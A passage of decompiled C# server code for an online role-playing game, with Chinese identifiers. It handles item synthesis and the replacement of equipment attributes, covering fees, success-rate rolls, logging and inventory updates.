								{
									RxjhClass.合成记录(base.Userid, base.UserName, value31.ItmeNAME, num, "披风成品属性符", "失败", 装备栏包裹[hcItimesClass144.位置]);
									合成提示(num, 0, 0, 装备栏包裹[hcItimesClass144.位置]);
								}
								减去物品(hcItimesClass145.位置, 1);
								减去物品(BitConverter.ToInt32(array10, 0), 1);
								if (hcItimesClass146 != null)
								{
									减去物品(hcItimesClass146.位置, 1);
								}
								if (BitConverter.ToInt32(装备栏包裹[hcItimesClass144.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass144.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass144.物品全局ID, 0)) ? true : false))
								{
									减去物品(hcItimesClass144.位置, 1);
									增加物品(hcItimesClass144.物品全局ID, hcItimesClass144.物品id, hcItimesClass144.位置, hcItimesClass144.物品数量, hcItimesClass144.物品属性);
								}
								装备栏包裹[hcItimesClass144.位置].锁定 = false;
								合成物品表.Clear();
								合成系统解锁();
								元宝合成开关 = 0;
								合成手续费 = 0;
								打开仓库中 = false;
							}
							else
							{
								合成提示(21, 5, 0, 装备栏包裹[hcItimesClass144.位置]);
								合成物品表.Clear();
							}
							break;
						}
						case 1008001118:
						{
							if (装备栏包裹[BitConverter.ToInt32(array10, 0)].Get物品ID != 1008001118)
							{
								break;
							}
							HcItimesClass hcItimesClass140 = null;
							HcItimesClass hcItimesClass141 = null;
							HcItimesClass hcItimesClass143 = null;
							if (合成物品表.ContainsKey(1))
							{
								hcItimesClass140 = 合成物品表[1];
							}
							if (合成物品表.ContainsKey(2))
							{
								hcItimesClass141 = 合成物品表[2];
							}
							if (合成物品表.ContainsKey(3))
							{
								hcItimesClass143 = 合成物品表[3];
							}
							if (BitConverter.ToInt64(装备栏包裹[hcItimesClass140.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass140.物品全局ID, 0) || BitConverter.ToInt64(装备栏包裹[hcItimesClass141.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass141.物品全局ID, 0) || (hcItimesClass143 != null && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass143.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass143.物品全局ID, 0)) ? true : false)))
							{
								break;
							}
							hcItimesClass140.得到属性();
							hcItimesClass140.强化属性阶段();
							hcItimesClass141.强化属性阶段();
							ItmeClass value30;
							if (装备栏包裹[hcItimesClass140.位置].物品绑定)
							{
								合成提示(21, 3, 0, 装备栏包裹[hcItimesClass140.位置]);
								合成物品表.Clear();
							}
							else if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass140.物品id, 0), out value30))
							{
								if (合成手续费 > 0)
								{
									if (base.Player_Money < 合成手续费)
									{
										合成提示(11, 4, 0, 装备栏包裹[hcItimesClass140.位置]);
										合成物品表.Clear();
										break;
									}
									base.Player_Money -= 合成手续费;
									更新金钱和负重();
								}
								double num110 = RNG.Next(1, 100);
								int 阶段数量3 = hcItimesClass141.阶段数量;
								if (阶段数量3 > 35)
								{
									if (阶段数量3 > 90 && ((阶段数量3 <= 100) ? true : false))
									{
										int num116 = 阶段数量3 - 65;
									}
									else if (阶段数量3 > 70 && ((阶段数量3 <= 90) ? true : false))
									{
										int num115 = 阶段数量3 - 60;
									}
									else if (阶段数量3 > 50 && ((阶段数量3 <= 70) ? true : false))
									{
										int num114 = 4;
									}
									else if (阶段数量3 > 45 && ((阶段数量3 <= 50) ? true : false))
									{
										int num113 = 3;
									}
									else if (阶段数量3 > 40 && ((阶段数量3 <= 45) ? true : false))
									{
										int num112 = 2;
									}
									else if (阶段数量3 >= 35 && ((阶段数量3 <= 40) ? true : false))
									{
										int num111 = 1;
									}
								}
								double num117 = World.属性替换失败率;
								if (value30.FLD_RESIDE2 != 6)
								{
									if (hcItimesClass140.属性1.属性数量 == 0 || hcItimesClass140.属性2.属性数量 == 0 || hcItimesClass140.属性3.属性数量 == 0 || ((hcItimesClass140.属性4.属性数量 == 0) ? true : false))
									{
										合成提示(21, 5, 0, 装备栏包裹[hcItimesClass140.位置]);
										合成物品表.Clear();
										break;
									}
								}
								else if (hcItimesClass140.属性1.属性数量 == 0 || ((hcItimesClass140.属性2.属性数量 == 0) ? true : false))
								{
									合成提示(21, 5, 0, 装备栏包裹[hcItimesClass140.位置]);
									合成物品表.Clear();
									break;
								}
								if (hcItimesClass143 != null)
								{
									num110 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass143.物品id, 0));
								}
								if (元宝合成开关 == 1)
								{
									num110 += 5.0;
								}
								if (base.FLD_VIP == 1)
								{
									num110 += 100.0 * World.VIP合成率增加百分比;
								}
								if (World.合成率 != 0.0)
								{
									num110 += 100.0 * World.合成率;
								}
								if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
								{
									num110 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
								}
								if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
								{
									num110 += 100.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
								}
								if (num110 >= num117)
								{
									switch (num92)
									{
									case 0:
										if (hcItimesClass140.属性1.属性类型 != 0)
										{
											if (hcItimesClass141.阶段类型 == 8)
											{
												hcItimesClass140.属性1.气功属性类型 = hcItimesClass141.气功属性类型;
											}
											hcItimesClass140.属性1.属性类型 = hcItimesClass141.阶段类型;
											hcItimesClass140.属性1.属性数量 = hcItimesClass141.阶段数量;
											hcItimesClass140.设置属性();
										}
										break;
									case 1:
										if (hcItimesClass140.属性2.属性类型 != 0)
										{
											if (hcItimesClass141.阶段类型 == 8)
											{
												hcItimesClass140.属性2.气功属性类型 = hcItimesClass141.气功属性类型;
											}
											hcItimesClass140.属性2.属性类型 = hcItimesClass141.阶段类型;
											hcItimesClass140.属性2.属性数量 = hcItimesClass141.阶段数量;
											hcItimesClass140.设置属性();
										}
										break;
									case 2:
										if (value30.FLD_RESIDE2 == 6)
										{
											if (hcItimesClass140.属性2.属性类型 != 0)
											{
												if (hcItimesClass141.阶段类型 == 8)
												{
													hcItimesClass140.属性2.气功属性类型 = hcItimesClass141.气功属性类型;
												}
												hcItimesClass140.属性2.属性类型 = hcItimesClass141.阶段类型;
												hcItimesClass140.属性2.属性数量 = hcItimesClass141.阶段数量;
												hcItimesClass140.设置属性();
											}
										}
										else if (hcItimesClass140.属性3.属性类型 != 0)
										{
											if (hcItimesClass141.阶段类型 == 8)
											{
												hcItimesClass140.属性3.气功属性类型 = hcItimesClass141.气功属性类型;
											}
											hcItimesClass140.属性3.属性类型 = hcItimesClass141.阶段类型;
											hcItimesClass140.属性3.属性数量 = hcItimesClass141.阶段数量;
											hcItimesClass140.设置属性();
										}
										break;
									case 3:
										if (hcItimesClass140.属性4.属性类型 != 0)
										{
											if (hcItimesClass141.阶段类型 == 8)
											{
												hcItimesClass140.属性4.气功属性类型 = hcItimesClass141.气功属性类型;
											}
											hcItimesClass140.属性4.属性类型 = hcItimesClass141.阶段类型;
											hcItimesClass140.属性4.属性数量 = hcItimesClass141.阶段数量;
											hcItimesClass140.设置属性();
										}
										break;
									}
									RxjhClass.合成记录(base.Userid, base.UserName, value30.ItmeNAME, num, "至尊属性提升符", "成功", 装备栏包裹[hcItimesClass140.位置]);
									合成提示(num, 1, 0, 装备栏包裹[hcItimesClass140.位置]);
								}
								else
								{
									RxjhClass.合成记录(base.Userid, base.UserName, value30.ItmeNAME, num, "至尊属性提升符", "失败", 装备栏包裹[hcItimesClass140.位置]);
									合成提示(num, 0, 0, 装备栏包裹[hcItimesClass140.位置]);
								}
								减去物品(hcItimesClass141.位置, 1);
								减去物品(BitConverter.ToInt32(array10, 0), 1);
								if (hcItimesClass143 != null)
								{
									减去物品(hcItimesClass143.位置, 1);
								}
								if (BitConverter.ToInt32(装备栏包裹[hcItimesClass140.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass140.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass140.物品全局ID, 0)) ? true : false))
								{
									减去物品(hcItimesClass140.位置, 1);
									增加物品(hcItimesClass140.物品全局ID, hcItimesClass140.物品id, hcItimesClass140.位置, hcItimesClass140.物品数量, hcItimesClass140.物品属性);
								}
								装备栏包裹[hcItimesClass140.位置].锁定 = false;
								合成物品表.Clear();
								合成系统解锁();
								元宝合成开关 = 0;
								合成手续费 = 0;
								打开仓库中 = false;
							}
							else
							{
								合成提示(21, 5, 0, 装备栏包裹[hcItimesClass140.位置]);
								合成物品表.Clear();
							}
							break;
						}
						case 1008000137:
						{
							if (装备栏包裹[BitConverter.ToInt32(array10, 0)].Get物品ID != 1008000137)
							{
								break;
							}
							HcItimesClass hcItimesClass137 = null;
							HcItimesClass hcItimesClass138 = null;
							HcItimesClass hcItimesClass139 = null;
							if (合成物品表.ContainsKey(1))
							{
								hcItimesClass137 = 合成物品表[1];
							}
							if (合成物品表.ContainsKey(2))
							{
								hcItimesClass138 = 合成物品表[2];
							}
							if (合成物品表.ContainsKey(3))
							{
								hcItimesClass139 = 合成物品表[3];
							}
							if (BitConverter.ToInt64(装备栏包裹[hcItimesClass137.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass137.物品全局ID, 0) || BitConverter.ToInt64(装备栏包裹[hcItimesClass138.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass138.物品全局ID, 0) || (hcItimesClass139 != null && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass139.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass139.物品全局ID, 0)) ? true : false)))
							{
								break;
							}
							hcItimesClass137.得到属性();
							hcItimesClass137.强化属性阶段();
							hcItimesClass138.强化属性阶段();
							ItmeClass value29;
							if (装备栏包裹[hcItimesClass137.位置].物品绑定)
							{
								合成提示(21, 3, 0, 装备栏包裹[hcItimesClass137.位置]);
								合成物品表.Clear();
							}
							else if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass137.物品id, 0), out value29))
							{
								if (合成手续费 > 0)
								{
									if (base.Player_Money < 合成手续费)
									{
										合成提示(11, 4, 0, 装备栏包裹[hcItimesClass137.位置]);
										合成物品表.Clear();
										break;
									}
									base.Player_Money -= 合成手续费;
									更新金钱和负重();
								}
								double num102 = RNG.Next(1, 100);
								int 阶段数量2 = hcItimesClass138.阶段数量;
								if (阶段数量2 > 35)
								{
									if (阶段数量2 > 90 && ((阶段数量2 <= 100) ? true : false))
									{
										int num108 = 阶段数量2 - 65;
									}
									else if (阶段数量2 > 70 && ((阶段数量2 <= 90) ? true : false))
									{
										int num107 = 阶段数量2 - 60;
									}
									else if (阶段数量2 > 50 && ((阶段数量2 <= 70) ? true : false))
									{
										int num106 = 4;
									}
									else if (阶段数量2 > 45 && ((阶段数量2 <= 50) ? true : false))
									{
										int num105 = 3;
									}
									else if (阶段数量2 > 40 && ((阶段数量2 <= 45) ? true : false))
									{
										int num104 = 2;
									}
									else if (阶段数量2 >= 35 && ((阶段数量2 <= 40) ? true : false))
									{
										int num103 = 1;
									}
								}
								double num109 = World.属性替换失败率;
								if (value29.FLD_RESIDE2 != 6)
								{
									if (hcItimesClass137.属性1.属性数量 == 0 || hcItimesClass137.属性2.属性数量 == 0 || hcItimesClass137.属性3.属性数量 == 0 || ((hcItimesClass137.属性4.属性数量 == 0) ? true : false))
									{
										合成提示(21, 5, 0, 装备栏包裹[hcItimesClass137.位置]);
										合成物品表.Clear();
										break;
									}
								}
								else if (hcItimesClass137.属性1.属性数量 == 0 || ((hcItimesClass137.属性2.属性数量 == 0) ? true : false))
								{
									合成提示(21, 5, 0, 装备栏包裹[hcItimesClass137.位置]);
									合成物品表.Clear();
									break;
								}
								if (hcItimesClass139 != null)
								{
									num102 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass139.物品id, 0));
								}
								if (元宝合成开关 == 1)
								{
									num102 += 5.0;
								}
								if (base.FLD_VIP == 1)
								{
									num102 += 100.0 * World.VIP合成率增加百分比;
								}
								if (World.合成率 != 0.0)
								{
									num102 += 100.0 * World.合成率;
								}
								if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
								{
									num102 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
								}
								if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
								{
									num102 += 100.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
								}
								if (num102 >= num109)
								{
									switch (num92)
									{
									case 0:
										if (hcItimesClass137.属性1.属性类型 != 0)
										{
											if (hcItimesClass138.阶段类型 == 8)
											{
												hcItimesClass137.属性1.气功属性类型 = hcItimesClass138.气功属性类型;
											}
											hcItimesClass137.属性1.属性类型 = hcItimesClass138.阶段类型;
											hcItimesClass137.属性1.属性数量 = hcItimesClass138.阶段数量;
											hcItimesClass137.设置属性();
										}
										break;
									case 1:
										if (hcItimesClass137.属性2.属性类型 != 0)
										{
											if (hcItimesClass138.阶段类型 == 8)
											{
												hcItimesClass137.属性2.气功属性类型 = hcItimesClass138.气功属性类型;
											}
											hcItimesClass137.属性2.属性类型 = hcItimesClass138.阶段类型;
											hcItimesClass137.属性2.属性数量 = hcItimesClass138.阶段数量;
											hcItimesClass137.设置属性();
										}
										break;
									case 2:
										if (value29.FLD_RESIDE2 == 6)
										{
											if (hcItimesClass137.属性2.属性类型 != 0)
											{
												if (hcItimesClass138.阶段类型 == 8)
												{
													hcItimesClass137.属性2.气功属性类型 = hcItimesClass138.气功属性类型;
												}
												hcItimesClass137.属性2.属性类型 = hcItimesClass138.阶段类型;
												hcItimesClass137.属性2.属性数量 = hcItimesClass138.阶段数量;
												hcItimesClass137.设置属性();
											}
										}
										else if (hcItimesClass137.属性3.属性类型 != 0)
										{
											if (hcItimesClass138.阶段类型 == 8)
											{
												hcItimesClass137.属性3.气功属性类型 = hcItimesClass138.气功属性类型;
											}
											hcItimesClass137.属性3.属性类型 = hcItimesClass138.阶段类型;
											hcItimesClass137.属性3.属性数量 = hcItimesClass138.阶段数量;
											hcItimesClass137.设置属性();
										}
										break;
									case 3:
										if (hcItimesClass137.属性4.属性类型 != 0)
										{
											if (hcItimesClass138.阶段类型 == 8)
											{
												hcItimesClass137.属性4.气功属性类型 = hcItimesClass138.气功属性类型;
											}
											hcItimesClass137.属性4.属性类型 = hcItimesClass138.阶段类型;
											hcItimesClass137.属性4.属性数量 = hcItimesClass138.阶段数量;
											hcItimesClass137.设置属性();
										}
										break;
									}
									RxjhClass.合成记录(base.Userid, base.UserName, value29.ItmeNAME, num, "至尊属性提升符", "成功", 装备栏包裹[hcItimesClass137.位置]);
									合成提示(num, 1, 0, 装备栏包裹[hcItimesClass137.位置]);
								}
								else
								{
									RxjhClass.合成记录(base.Userid, base.UserName, value29.ItmeNAME, num, "至尊属性提升符", "失败", 装备栏包裹[hcItimesClass137.位置]);
									合成提示(num, 0, 0, 装备栏包裹[hcItimesClass137.位置]);
								}
								减去物品(hcItimesClass138.位置, 1);
								减去物品(BitConverter.ToInt32(array10, 0), 1);
								if (hcItimesClass139 != null)
								{
									减去物品(hcItimesClass139.位置, 1);
								}
								if (BitConverter.ToInt32(装备栏包裹[hcItimesClass137.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass137.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass137.物品全局ID, 0)) ? true : false))
								{
									减去物品(hcItimesClass137.位置, 1);
									增加物品(hcItimesClass137.物品全局ID, hcItimesClass137.物品id, hcItimesClass137.位置, hcItimesClass137.物品数量, hcItimesClass137.物品属性);
								}
								装备栏包裹[hcItimesClass137.位置].锁定 = false;
								合成物品表.Clear();
								合成系统解锁();
								元宝合成开关 = 0;
								合成手续费 = 0;
								打开仓库中 = false;
							}
							else
							{
								合成提示(21, 5, 0, 装备栏包裹[hcItimesClass137.位置]);
								合成物品表.Clear();
							}
							break;
						}
						case 1008000041:
						case 1008002121:
						{
							HcItimesClass hcItimesClass134 = null;
							HcItimesClass hcItimesClass135 = null;
							HcItimesClass hcItimesClass136 = null;
							if (合成物品表.ContainsKey(1))
							{
								hcItimesClass134 = 合成物品表[1];
							}
							if (合成物品表.ContainsKey(2))
							{
								hcItimesClass135 = 合成物品表[2];
							}
							if (合成物品表.ContainsKey(3))
							{
								hcItimesClass136 = 合成物品表[3];
							}
							if (BitConverter.ToInt64(装备栏包裹[hcItimesClass134.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass134.物品全局ID, 0) || BitConverter.ToInt64(装备栏包裹[hcItimesClass135.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass135.物品全局ID, 0) || (hcItimesClass136 != null && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass136.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass136.物品全局ID, 0)) ? true : false)))
							{
								break;
							}
							hcItimesClass134.得到属性();
							hcItimesClass134.强化属性阶段();
							hcItimesClass135.强化属性阶段();
							ItmeClass value28;
							if (装备栏包裹[hcItimesClass134.位置].物品绑定)
							{
								合成提示(21, 3, 0, 装备栏包裹[hcItimesClass134.位置]);
								合成物品表.Clear();
							}
							else if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass134.物品id, 0), out value28))
							{
								if (合成手续费 > 0)
								{
									if (base.Player_Money < 合成手续费)
									{
										合成提示(11, 4, 0, 装备栏包裹[hcItimesClass134.位置]);
										合成物品表.Clear();
										break;
									}
									base.Player_Money -= 合成手续费;
									更新金钱和负重();
								}
								double num93 = RNG.Next(1, 100);
								int 阶段数量 = hcItimesClass135.阶段数量;
								if (阶段数量 > 35)
								{
									if (阶段数量 > 90 && ((阶段数量 <= 100) ? true : false))
									{
										int num99 = 阶段数量 - 65;
									}
									else if (阶段数量 > 70 && ((阶段数量 <= 90) ? true : false))
									{
										int num98 = 阶段数量 - 60;
									}
									else if (阶段数量 > 50 && ((阶段数量 <= 70) ? true : false))
									{
										int num97 = 4;
									}
									else if (阶段数量 > 45 && ((阶段数量 <= 50) ? true : false))
									{
										int num96 = 3;
									}
									else if (阶段数量 > 40 && ((阶段数量 <= 45) ? true : false))
									{
										int num95 = 2;
									}
									else if (阶段数量 >= 35 && ((阶段数量 <= 40) ? true : false))
									{
										int num94 = 1;
									}
								}
								double num100 = World.属性替换失败率;
								if (value28.FLD_RESIDE2 == 4)
								{
									if (hcItimesClass134.属性1.属性数量 == 0 || hcItimesClass134.属性2.属性数量 == 0 || hcItimesClass134.属性3.属性数量 == 0 || ((hcItimesClass134.属性4.属性数量 == 0) ? true : false))
									{
										合成提示(21, 5, 0, 装备栏包裹[hcItimesClass134.位置]);
										合成物品表.Clear();
										break;
									}
									if (hcItimesClass136 != null)
									{
										num93 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass136.物品id, 0));
									}
									if (元宝合成开关 == 1)
									{
										num93 += 5.0;
									}
									if (base.FLD_VIP == 1)
									{
										num93 += 100.0 * World.VIP合成率增加百分比;
									}
									if (World.合成率 != 0.0)
									{
										num93 += 100.0 * World.合成率;
									}
									if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
									{
										num93 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
									}
									if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
									{
										num93 += 100.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
									}
									if (num93 >= num100)
									{
										switch (num92)
										{
										case 0:
											if (hcItimesClass134.属性1.属性类型 != 0)
											{
												if (hcItimesClass135.阶段类型 == 8)
												{
													hcItimesClass134.属性1.气功属性类型 = hcItimesClass135.气功属性类型;
												}
												hcItimesClass134.属性1.属性类型 = hcItimesClass135.阶段类型;
												hcItimesClass134.属性1.属性数量 = hcItimesClass135.阶段数量;
												hcItimesClass134.设置属性();
											}
											break;
										case 1:
											if (hcItimesClass134.属性2.属性类型 != 0)
											{
												if (hcItimesClass135.阶段类型 == 8)
												{
													hcItimesClass134.属性2.气功属性类型 = hcItimesClass135.气功属性类型;
												}
												hcItimesClass134.属性2.属性类型 = hcItimesClass135.阶段类型;
												hcItimesClass134.属性2.属性数量 = hcItimesClass135.阶段数量;
												hcItimesClass134.设置属性();
											}
											break;
										case 2:
											if (hcItimesClass134.属性3.属性类型 != 0)
											{
												if (hcItimesClass135.阶段类型 == 8)
												{
													hcItimesClass134.属性3.气功属性类型 = hcItimesClass135.气功属性类型;
												}
												hcItimesClass134.属性3.属性类型 = hcItimesClass135.阶段类型;
												hcItimesClass134.属性3.属性数量 = hcItimesClass135.阶段数量;
												hcItimesClass134.设置属性();
											}
											break;
										case 3:
											if (hcItimesClass134.属性4.属性类型 != 0)
											{
												if (hcItimesClass135.阶段类型 == 8)
												{
													hcItimesClass134.属性4.气功属性类型 = hcItimesClass135.气功属性类型;
												}
												hcItimesClass134.属性4.属性类型 = hcItimesClass135.阶段类型;
												hcItimesClass134.属性4.属性数量 = hcItimesClass135.阶段数量;
												hcItimesClass134.设置属性();
											}
											break;
										}
										RxjhClass.合成记录(base.Userid, base.UserName, value28.ItmeNAME, num, "火龙之石", "成功", 装备栏包裹[hcItimesClass134.位置]);
										合成提示(num, 1, 0, 装备栏包裹[hcItimesClass134.位置]);
									}
									else
									{
										RxjhClass.合成记录(base.Userid, base.UserName, value28.ItmeNAME, num, "火龙之石", "失败", 装备栏包裹[hcItimesClass134.位置]);
										合成提示(num, 0, 0, 装备栏包裹[hcItimesClass134.位置]);
									}
									减去物品(hcItimesClass135.位置, 1);
									减去物品(BitConverter.ToInt32(array10, 0), 1);
									if (hcItimesClass136 != null)
									{
										减去物品(hcItimesClass136.位置, 1);
									}
									if (BitConverter.ToInt32(装备栏包裹[hcItimesClass134.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass134.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass134.物品全局ID, 0)) ? true : false))
									{
										减去物品(hcItimesClass134.位置, 1);
										增加物品(hcItimesClass134.物品全局ID, hcItimesClass134.物品id, hcItimesClass134.位置, hcItimesClass134.物品数量, hcItimesClass134.物品属性);
									}
									装备栏包裹[hcItimesClass134.位置].锁定 = false;
									合成物品表.Clear();
									合成系统解锁();
									元宝合成开关 = 0;
									合成手续费 = 0;
									打开仓库中 = false;
								}
								else
								{
									合成提示(21, 5, 0, 装备栏包裹[hcItimesClass134.位置]);
									合成物品表.Clear();
								}
							}
							else
							{
								合成提示(21, 5, 0, 装备栏包裹[hcItimesClass134.位置]);
								合成物品表.Clear();
							}
							break;
						}
						}
						return;
					}
					catch (Exception ex107)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 合成属性 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex107.Message);
					}
					break;
				case 141:
					try
					{
						int num89 = 封包数据[14];
						if (装备栏包裹[num30].锁定)
						{
							合成提示(num, 3, 0, 装备栏包裹[num30]);
							break;
						}
						if (装备栏包裹[num30].物品绑定)
						{
							合成提示(num, 3, 0, 装备栏包裹[num30]);
							break;
						}
						if (装备栏包裹[num89].Get物品ID != 1008000041)
						{
							goto IL_12404;
						}
						string a = 装备栏包裹[num30].FLD_MAGIC1.ToString().Substring(0, 1);
						string b = 装备栏包裹[num30].FLD_MAGIC2.ToString().Substring(0, 1);
						string b2 = 装备栏包裹[num30].FLD_MAGIC3.ToString().Substring(0, 1);
						string b3 = 装备栏包裹[num30].FLD_MAGIC4.ToString().Substring(0, 1);
						if (!(a != b) && !(a != b2) && !(a != b3))
						{
							goto IL_12404;
						}
						合成提示(num, 5, 0, 装备栏包裹[num30]);
						goto end_IL_12271;
						IL_128d4:
						ItmeClass value25;
						if (value25.FLD_RESIDE2 != 1 && value25.FLD_RESIDE2 != 6 && value25.FLD_RESIDE2 != 2 && value25.FLD_RESIDE2 != 4 && ((value25.FLD_RESIDE2 != 5) ? true : false))
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
							合成物品表.Clear();
							break;
						}
						if (value25.FLD_LEVEL >= 130)
						{
							goto IL_127ca;
						}
						合成提示(num, 5, 0, 装备栏包裹[num30]);
						合成物品表.Clear();
						goto end_IL_12271;
						IL_127ca:
						if (装备栏包裹[num89].Get物品ID != 1008000137)
						{
							goto IL_126e4;
						}
						if (value25.FLD_RESIDE2 != 6)
						{
							if (装备栏包裹[num30].FLD_MAGIC1 != 0 && 装备栏包裹[num30].FLD_MAGIC2 != 0 && 装备栏包裹[num30].FLD_MAGIC3 != 0 && 装备栏包裹[num30].FLD_MAGIC4 != 0)
							{
								goto IL_129a0;
							}
							合成提示(num, 5, 0, 装备栏包裹[num30]);
						}
						else
						{
							if (装备栏包裹[num30].FLD_MAGIC1 != 0 && 装备栏包裹[num30].FLD_MAGIC2 != 0)
							{
								goto IL_129a0;
							}
							合成提示(num, 5, 0, 装备栏包裹[num30]);
						}
						goto end_IL_12271;
						IL_126e4:
						if (!合成物品表.ContainsKey(1))
						{
							合成手续费 = 计算合成强化费用(value25, num30, num);
							if (装备栏包裹[num89].Get物品ID == 1008001078)
							{
								合成手续费 = 10000000;
							}
							HcItimesClass hcItimesClass33 = new HcItimesClass();
							hcItimesClass33.位置 = num30;
							hcItimesClass33.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value26 = hcItimesClass33;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(1, value26);
							合成提示(num, 1, 合成手续费, 装备栏包裹[num30]);
						}
						goto end_IL_12271;
						IL_129a0:
						if (value25.FLD_RESIDE2 != 1 && value25.FLD_RESIDE2 != 6 && value25.FLD_RESIDE2 != 2 && value25.FLD_RESIDE2 != 4 && ((value25.FLD_RESIDE2 != 5) ? true : false))
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
							合成物品表.Clear();
							break;
						}
						if (value25.FLD_LEVEL >= 80 && value25.FLD_LEVEL <= 120)
						{
							goto IL_126e4;
						}
						合成提示(num, 5, 0, 装备栏包裹[num30]);
						合成物品表.Clear();
						goto end_IL_12271;
						IL_12404:
						if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out value25))
						{
							if (装备栏包裹[num89].Get物品ID == 1008000041)
							{
								bool flag4 = false;
								foreach (英雄职业武器 value97 in World.英雄职业武器系统.Values)
								{
									if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) == value97.装备ID)
									{
										flag4 = true;
										break;
									}
								}
								if (value25.FLD_RESIDE2 != 4)
								{
									合成提示(num, 5, 0, 装备栏包裹[num30]);
									break;
								}
								if (!flag4)
								{
									合成提示(num, 5, 0, 装备栏包裹[num30]);
									break;
								}
								goto IL_126e4;
							}
							if (装备栏包裹[num89].Get物品ID == 1008001078 && ((value25.FLD_RESIDE2 != 12 && value25.FLD_RESIDE2 != 14) ? true : false))
							{
								合成提示(num, 5, 0, 装备栏包裹[num30]);
								break;
							}
							if (装备栏包裹[num89].Get物品ID != 1008001118)
							{
								goto IL_127ca;
							}
							if (value25.FLD_RESIDE2 != 6)
							{
								if (装备栏包裹[num30].FLD_MAGIC1 != 0 && 装备栏包裹[num30].FLD_MAGIC2 != 0 && 装备栏包裹[num30].FLD_MAGIC3 != 0 && 装备栏包裹[num30].FLD_MAGIC4 != 0)
								{
									goto IL_128d4;
								}
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
							else
							{
								if (装备栏包裹[num30].FLD_MAGIC1 != 0 && 装备栏包裹[num30].FLD_MAGIC2 != 0)
								{
									goto IL_128d4;
								}
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
						}
						else
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
						}
						end_IL_12271:;
					}
					catch (Exception ex104)
					{
						MainForm.WriteLine(1, "合成系统 合成属性 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex104.Message);
					}
					break;
				case 142:
					try
					{
						if (合成物品表.Count == 0)
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
							break;
						}
						int num60 = 封包数据[14];
						HcItimesClass hcItimesClass96 = null;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass96 = 合成物品表[1];
						}
						ItmeClass value137;
						if (装备栏包裹[num60].Get物品ID == 1008000041 && ((装备栏包裹[hcItimesClass96.位置].FLD_MAGIC1.ToString().Substring(0, 1) != 装备栏包裹[num30].FLD_MAGIC0.ToString().Substring(0, 1)) ? true : false))
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
						}
						else if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass96.物品id, 0), out value137))
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
						}
						else if (装备栏包裹[num60].Get物品ID == 1008000041)
						{
							if (装备栏包裹[num30].Get物品ID != 800000061 && 装备栏包裹[num30].Get物品ID != 800000023 && ((装备栏包裹[num30].Get物品ID != 800000001) ? true : false))
							{
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
							else if (value137.FLD_LEVEL < 80)
							{
								if (装备栏包裹[num30].Get物品ID == 800000001)
								{
									goto IL_130cb;
								}
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
							else if (value137.FLD_LEVEL >= 80 && ((value137.FLD_LEVEL < 130) ? true : false))
							{
								if (装备栏包裹[num30].Get物品ID == 800000001 || 装备栏包裹[num30].Get物品ID == 800000023)
								{
									goto IL_130cb;
								}
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
							else
							{
								if (value137.FLD_LEVEL < 130 || 装备栏包裹[num30].Get物品ID == 800000061)
								{
									goto IL_130cb;
								}
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
						}
						else if (装备栏包裹[num60].Get物品ID == 1008001118)
						{
							if (装备栏包裹[num30].Get物品ID != 800000061 && ((装备栏包裹[num30].Get物品ID != 800000062) ? true : false))
							{
								合成提示(num, 5, 0, 装备栏包裹[num30]);
								break;
							}
